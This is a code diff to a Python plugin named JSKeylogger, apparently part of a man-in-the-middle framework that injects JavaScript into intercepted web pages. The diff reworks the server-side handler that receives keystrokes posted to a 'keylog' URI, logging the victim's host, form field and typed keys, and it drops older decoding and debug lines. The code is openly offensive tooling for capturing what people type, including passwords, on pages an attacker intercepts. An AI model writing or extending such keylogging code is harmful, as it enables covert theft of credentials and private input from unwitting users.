@@ -35,35 +35,11 @@ class JSKeylogger(Inject, Plugin):
         if 'keylog' in request.uri:
             request.handle_post_output = True
 
-            name = request.postData['name']
-            value = request.postData['value']
-
-#            raw_keys = request.postData.split("&&")[0]
-#            input_field = request.postData.split("&&")[1]
-#
-#            keys = raw_keys.split(",")
-#            if keys:
-#                del keys[0]
-#                del keys[len(keys)-1]
-#
-#                nice = ''
-#                for n in keys:
-#                    if n == '9':
-#                        nice += "<TAB>"
-#                    elif n == '8':
-#                        nice = nice[:-1]
-#                    elif n == '13':
-#                        nice = ''
-#                    else:
-#                        try:
-#                            nice += n.decode('hex')
-#                        except:
-#                            self.clientlog.error("Error decoding char: {}".format(n), extra=request.clientInfo)
+            arr = request.postData
+            name = arr[0].split("=")[1]
+            value = arr[1].split("=")[1]
 
             self.clientlog.info("Host: {} | Field: {} | Keys: {}".format(request.headers['host'], name, value), extra=request.clientInfo)
-            self.clientlog.info("Host: {} | Field: {} | Keys: {}".format(request.headers['host'], "tttttt", "tttttt"), extra=request.clientInfo)
-            self.clientlog.info("Host: {} | Field: {} | Keys: {}".format(request.headers['host'], request.postData, request.postData), extra=request.clientInfo)
-            self.clientlog.info("Host: {} | Field: {} | Keys: {}".format(request.headers['host'], request.post, request.post), extra=request.clientInfo)
 
     def options(self, options):
         pass
